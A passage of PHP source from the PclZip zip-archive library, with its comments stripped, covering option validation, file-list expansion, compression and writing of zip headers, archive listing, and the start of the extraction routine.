	                       "Unknown parameter '"
						   .$p_options_list[$i]."'");

        return PclZip::errorCode();
    }

    $i++;
  }

  if ($v_requested_options !== false) {
    for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
      if ($v_requested_options[$key] == 'mandatory') {
        if (!isset($v_result_list[$key])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");

          return PclZip::errorCode();
        }
      }
    }
  }
  
  if (!isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
    
  }

  return $v_result;
}

function privOptionDefaultThreshold(&$p_options)
{
  $v_result=1;
  
  if (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
      || isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) {
    return $v_result;
  }
  
  $v_memory_limit = ini_get('memory_limit');
  $v_memory_limit = trim($v_memory_limit);
  $last = strtolower(substr($v_memory_limit, -1));

  if($last == 'g')
      $v_memory_limit = $v_memory_limit*1073741824;
  if($last == 'm')
      $v_memory_limit = $v_memory_limit*1048576;
  if($last == 'k')
      $v_memory_limit = $v_memory_limit*1024;
          
  $p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] = floor($v_memory_limit*PCLZIP_TEMPORARY_FILE_RATIO);
  

  if ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] < 1048576) {
    unset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]);
  }
        
  return $v_result;
}

function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)
{
  $v_result=1;
  
  foreach ($p_file_list as $v_key => $v_value) {
  
    if (!isset($v_requested_options[$v_key])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file attribute '".$v_key."' for this file");

      return PclZip::errorCode();
    }

    switch ($v_key) {
      case PCLZIP_ATT_FILE_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['filename'] = PclZipUtilPathReduction($v_value);
        
        if ($p_filedescr['filename'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

      break;

      case PCLZIP_ATT_FILE_NEW_SHORT_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_short_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_short_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty short filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_NEW_FULL_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_full_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_full_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty full filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_COMMENT :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['comment'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_MTIME :
        if (!is_integer($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". Integer expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['mtime'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_CONTENT :
        $p_filedescr['content'] = $v_value;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                           "Unknown parameter '".$v_key."'");

        return PclZip::errorCode();
    }

    if ($v_requested_options !== false) {
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
        if ($v_requested_options[$key] == 'mandatory') {
          if (!isset($p_file_list[$key])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
            return PclZip::errorCode();
          }
        }
      }
    }
  
  }
  
  return $v_result;
}

function privFileDescrExpand(&$p_filedescr_list, &$p_options)
{
  $v_result=1;
  
  $v_result_list = array();
  
  for ($i=0; $i<sizeof($p_filedescr_list); $i++) {
    
    $v_descr = $p_filedescr_list[$i];
    
    $v_descr['filename'] = PclZipUtilTranslateWinPath($v_descr['filename'], false);
    $v_descr['filename'] = PclZipUtilPathReduction($v_descr['filename']);
    
    if (file_exists($v_descr['filename'])) {
      if (@is_file($v_descr['filename'])) {
        $v_descr['type'] = 'file';
      }
      else if (@is_dir($v_descr['filename'])) {
        $v_descr['type'] = 'folder';
      }
      else if (@is_link($v_descr['filename'])) {
        continue;
      }
      else {
        continue;
      }
    }
    
    else if (isset($v_descr['content'])) {
      $v_descr['type'] = 'virtual_file';
    }
    
    else {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$v_descr['filename']."' does not exist");

      return PclZip::errorCode();
    }
    
    $this->privCalculateStoredFilename($v_descr, $p_options);
    
    $v_result_list[sizeof($v_result_list)] = $v_descr;
    
    if ($v_descr['type'] == 'folder') {
      $v_dirlist_descr = array();
      $v_dirlist_nb = 0;
      if ($v_folder_handler = @opendir($v_descr['filename'])) {
        while (($v_item_handler = @readdir($v_folder_handler)) !== false) {

          if (($v_item_handler == '.') || ($v_item_handler == '..')) {
              continue;
          }
          
          $v_dirlist_descr[$v_dirlist_nb]['filename'] = $v_descr['filename'].'/'.$v_item_handler;
          
          if (($v_descr['stored_filename'] != $v_descr['filename'])
               && (!isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))) {
            if ($v_descr['stored_filename'] != '') {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_descr['stored_filename'].'/'.$v_item_handler;
            }
            else {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_item_handler;
            }
          }
    
          $v_dirlist_nb++;
        }
        
        @closedir($v_folder_handler);
      }
      else {
      }
      
      if ($v_dirlist_nb != 0) {
        if (($v_result = $this->privFileDescrExpand($v_dirlist_descr, $p_options)) != 1) {
          return $v_result;
        }
        
        $v_result_list = array_merge($v_result_list, $v_dirlist_descr);
      }
      else {
      }
        
      unset($v_dirlist_descr);
    }
  }
  
  $p_filedescr_list = $v_result_list;

  return $v_result;
}

function privCreate($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();
  
  $this->privDisableMagicQuotes();

  if (($v_result = $this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privAdd($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if ((!is_file($this->zipname)) || (filesize($this->zipname) == 0))
  {

    $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);

    return $v_result;
  }
  $this->privDisableMagicQuotes();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    fclose($v_zip_temp_fd);
    $this->privCloseFd();
    @unlink($v_zip_temp_name);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        fclose($v_zip_temp_fd);
        $this->privCloseFd();
        @unlink($v_zip_temp_name);
        $this->privSwapBackMagicQuotes();

        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = $v_central_dir['comment'];
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_ADD_COMMENT])) {
    $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_PREPEND_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment;
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count+$v_central_dir['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  $this->privSwapBackMagicQuotes();

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privOpenFd($p_mode)
{
  $v_result=1;

  if ($this->zip_fd != 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open');

    return PclZip::errorCode();
  }

  if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode');

    return PclZip::errorCode();
  }

  return $v_result;
}

function privCloseFd()
{
  $v_result=1;

  if ($this->zip_fd != 0)
    @fclose($this->zip_fd);
  $this->zip_fd = 0;

  return $v_result;
}

function privAddList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  for ($i=0,$v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = '';
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count, $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);

    return $v_result;
  }

  return $v_result;
}

function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_header = array();

  $v_nb = sizeof($p_result_list);

  for ($j=0; ($j<sizeof($p_filedescr_list)) && ($v_result==1); $j++) {
    $p_filedescr_list[$j]['filename']
    = PclZipUtilTranslateWinPath($p_filedescr_list[$j]['filename'], false);
    

    if ($p_filedescr_list[$j]['filename'] == "") {
      continue;
    }

    if (   ($p_filedescr_list[$j]['type'] != 'virtual_file')
        && (!file_exists($p_filedescr_list[$j]['filename']))) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$p_filedescr_list[$j]['filename']."' does not exist");
      return PclZip::errorCode();
    }

    if (   ($p_filedescr_list[$j]['type'] == 'file')
        || ($p_filedescr_list[$j]['type'] == 'virtual_file')
        || (   ($p_filedescr_list[$j]['type'] == 'folder')
            && (   !isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])
                || !$p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))
        ) {

      $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header,
                                     $p_options);
      if ($v_result != 1) {
        return $v_result;
      }

      $p_result_list[$v_nb++] = $v_header;
    }
  }

  return $v_result;
}

function privAddFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];

  if ($p_filename == "") {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file list parameter (invalid or empty list)");

    return PclZip::errorCode();
  }


  clearstatcache();
  $p_header['version'] = 20;
  $p_header['version_extracted'] = 10;
  $p_header['flag'] = 0;
  $p_header['compression'] = 0;
  $p_header['crc'] = 0;
  $p_header['compressed_size'] = 0;
  $p_header['filename_len'] = strlen($p_filename);
  $p_header['extra_len'] = 0;
  $p_header['disk'] = 0;
  $p_header['internal'] = 0;
  $p_header['offset'] = 0;
  $p_header['filename'] = $p_filename;
  $p_header['stored_filename'] = $p_filedescr['stored_filename'];
  $p_header['extra'] = '';
  $p_header['status'] = 'ok';
  $p_header['index'] = -1;

  if ($p_filedescr['type']=='file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type']=='folder') {
    $p_header['external'] = 0x00000010;
    $p_header['mtime'] = filemtime($p_filename);
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = strlen($p_filedescr['content']);
  }
  

  if (isset($p_filedescr['mtime'])) {
    $p_header['mtime'] = $p_filedescr['mtime'];
  }
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['mtime'] = time();
  }
  else {
    $p_header['mtime'] = filemtime($p_filename);
  }

  if (isset($p_filedescr['comment'])) {
    $p_header['comment_len'] = strlen($p_filedescr['comment']);
    $p_header['comment'] = $p_filedescr['comment'];
  }
  else {
    $p_header['comment_len'] = 0;
    $p_header['comment'] = '';
  }

  if (isset($p_options[PCLZIP_CB_PRE_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_ADD](PCLZIP_CB_PRE_ADD, $v_local_header);
    if ($v_result == 0) {
      $p_header['status'] = "skipped";
      $v_result = 1;
    }

    if ($p_header['stored_filename'] != $v_local_header['stored_filename']) {
      $p_header['stored_filename'] = PclZipUtilPathReduction($v_local_header['stored_filename']);
    }
  }

  if ($p_header['stored_filename'] == "") {
    $p_header['status'] = "filtered";
  }
  
  if (strlen($p_header['stored_filename']) > 0xFF) {
    $p_header['status'] = 'filename_too_long';
  }

  if ($p_header['status'] == 'ok') {

    if ($p_filedescr['type'] == 'file') {
      if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
          && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
              || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                  && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_header['size'])) ) ) {
        $v_result = $this->privAddFileUsingTempFile($p_filedescr, $p_header, $p_options);
        if ($v_result < PCLZIP_ERR_NO_ERROR) {
          return $v_result;
        }
      }
      
      else {

      if (($v_file = @fopen($p_filename, "rb")) == 0) {
        PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
        return PclZip::errorCode();
      }

      $v_content = @fread($v_file, $p_header['size']);

      @fclose($v_file);

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);

      }

    }

    else if ($p_filedescr['type'] == 'virtual_file') {
        
      $v_content = $p_filedescr['content'];

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
    }

    else if ($p_filedescr['type'] == 'folder') {
      if (@substr($p_header['stored_filename'], -1) != '/') {
        $p_header['stored_filename'] .= '/';
      }

      $p_header['size'] = 0;

      if (($v_result = $this->privWriteFileHeader($p_header)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (isset($p_options[PCLZIP_CB_POST_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_ADD](PCLZIP_CB_POST_ADD, $v_local_header);
    if ($v_result == 0) {
      $v_result = 1;
    }

  }

  return $v_result;
}

function privAddFileUsingTempFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=PCLZIP_ERR_NO_ERROR;
  
  $p_filename = $p_filedescr['filename'];


  if (($v_file = @fopen($p_filename, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
    return PclZip::errorCode();
  }

  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_file_compressed = @gzopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }

  $v_size = filesize($p_filename);
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file, $v_read_size);
    @gzputs($v_file_compressed, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file);
  @gzclose($v_file_compressed);

  if (filesize($v_gzip_temp_name) < 18) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'gzip temporary file \''.$v_gzip_temp_name.'\' has invalid filesize - should be minimum 18 bytes');
    return PclZip::errorCode();
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  $v_binary_data = @fread($v_file_compressed, 10);
  $v_data_header = unpack('a1id1/a1id2/a1cm/a1flag/Vmtime/a1xfl/a1os', $v_binary_data);

  $v_data_header['os'] = bin2hex($v_data_header['os']);

  @fseek($v_file_compressed, filesize($v_gzip_temp_name)-8);
  $v_binary_data = @fread($v_file_compressed, 8);
  $v_data_footer = unpack('Vcrc/Vcompressed_size', $v_binary_data);

  $p_header['compression'] = ord($v_data_header['cm']);
  $p_header['crc'] = $v_data_footer['crc'];
  $p_header['compressed_size'] = filesize($v_gzip_temp_name)-18;

  @fclose($v_file_compressed);

  if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
    return $v_result;
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  fseek($v_file_compressed, 10);
  $v_size = $p_header['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file_compressed, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file_compressed);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privCalculateStoredFilename(&$p_filedescr, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];
  if (isset($p_options[PCLZIP_OPT_ADD_PATH])) {
    $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH];
  }
  else {
    $p_add_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_PATH])) {
    $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH];
  }
  else {
    $p_remove_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
    $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH];
  }
  else {
    $p_remove_all_dir = 0;
  }


  if (isset($p_filedescr['new_full_name'])) {
    $v_stored_filename = PclZipUtilTranslateWinPath($p_filedescr['new_full_name']);
  }
  
  else {

    if (isset($p_filedescr['new_short_name'])) {
      $v_path_info = pathinfo($p_filename);
      $v_dir = '';
      if ($v_path_info['dirname'] != '') {
        $v_dir = $v_path_info['dirname'].'/';
      }
      $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];
    }
    else {
      $v_stored_filename = $p_filename;
    }

    if ($p_remove_all_dir) {
      $v_stored_filename = basename($p_filename);
    }
    else if ($p_remove_dir != "") {
      if (substr($p_remove_dir, -1) != '/')
        $p_remove_dir .= "/";

      if (   (substr($p_filename, 0, 2) == "./")
          || (substr($p_remove_dir, 0, 2) == "./")) {
          
        if (   (substr($p_filename, 0, 2) == "./")
            && (substr($p_remove_dir, 0, 2) != "./")) {
          $p_remove_dir = "./".$p_remove_dir;
        }
        if (   (substr($p_filename, 0, 2) != "./")
            && (substr($p_remove_dir, 0, 2) == "./")) {
          $p_remove_dir = substr($p_remove_dir, 2);
        }
      }

      $v_compare = PclZipUtilPathInclusion($p_remove_dir,
                                           $v_stored_filename);
      if ($v_compare > 0) {
        if ($v_compare == 2) {
          $v_stored_filename = "";
        }
        else {
          $v_stored_filename = substr($v_stored_filename,
                                      strlen($p_remove_dir));
        }
      }
    }
    
    $v_stored_filename = PclZipUtilTranslateWinPath($v_stored_filename);
    
    if ($p_add_dir != "") {
      if (substr($p_add_dir, -1) == "/")
        $v_stored_filename = $p_add_dir.$v_stored_filename;
      else
        $v_stored_filename = $p_add_dir."/".$v_stored_filename;
    }
  }

  $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);
  $p_filedescr['stored_filename'] = $v_stored_filename;
  
  return $v_result;
}

function privWriteFileHeader(&$p_header)
{
  $v_result=1;

  $p_header['offset'] = ftell($this->zip_fd);

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

  $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50,
                      $p_header['version_extracted'], $p_header['flag'],
                        $p_header['compression'], $v_mtime, $v_mdate,
                        $p_header['crc'], $p_header['compressed_size'],
					  $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len']);

  fputs($this->zip_fd, $v_binary_data, 30);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }

  return $v_result;
}

function privWriteCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];


  $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50,
                      $p_header['version'], $p_header['version_extracted'],
                        $p_header['flag'], $p_header['compression'],
					  $v_mtime, $v_mdate, $p_header['crc'],
                        $p_header['compressed_size'], $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len'], $p_header['comment_len'],
                        $p_header['disk'], $p_header['internal'],
					  $p_header['external'], $p_header['offset']);

  fputs($this->zip_fd, $v_binary_data, 46);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }
  if ($p_header['comment_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['comment'], $p_header['comment_len']);
  }

  return $v_result;
}

function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment)
{
  $v_result=1;

  $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries,
                      $p_nb_entries, $p_size,
					  $p_offset, strlen($p_comment));

  fputs($this->zip_fd, $v_binary_data, 22);

  if (strlen($p_comment) != 0)
  {
    fputs($this->zip_fd, $p_comment, strlen($p_comment));
  }

  return $v_result;
}

function privList(&$p_list)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
  {
    $this->privSwapBackMagicQuotes();
    
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

    return PclZip::errorCode();
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_central_dir['offset']))
  {
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  for ($i=0; $i<$v_central_dir['entries']; $i++)
  {
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_header['index'] = $i;

    $this->privConvertHeader2FileInfo($v_header, $p_list[$i]);
    unset($v_header);
  }

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privConvertHeader2FileInfo($p_header, &$p_info)
{
  $v_result=1;

  $v_temp_path = PclZipUtilPathReduction($p_header['filename']);
  $p_info['filename'] = $v_temp_path;
  $v_temp_path = PclZipUtilPathReduction($p_header['stored_filename']);
  $p_info['stored_filename'] = $v_temp_path;
  $p_info['size'] = $p_header['size'];
  $p_info['compressed_size'] = $p_header['compressed_size'];
  $p_info['mtime'] = $p_header['mtime'];
  $p_info['comment'] = $p_header['comment'];
  $p_info['folder'] = (($p_header['external']&0x00000010)==0x00000010);
  $p_info['index'] = $p_header['index'];
  $p_info['status'] = $p_header['status'];
  $p_info['crc'] = $p_header['crc'];

  return $v_result;
}

function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (   ($p_path == "")
    || (   (substr($p_path, 0, 1) != "/")
	    && (substr($p_path, 0, 3) != "../")
		&& (substr($p_path,1,2)!=":/")))
    $p_path = "./".$p_path;

  if (($p_path != "./") && ($p_path != "/"))
  {
    while (substr($p_path, -1) == "/")
    {
      $p_path = substr($p_path, 0, strlen($p_path)-1);
    }
  }

  if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/'))
  {
    $p_remove_path .= '/';
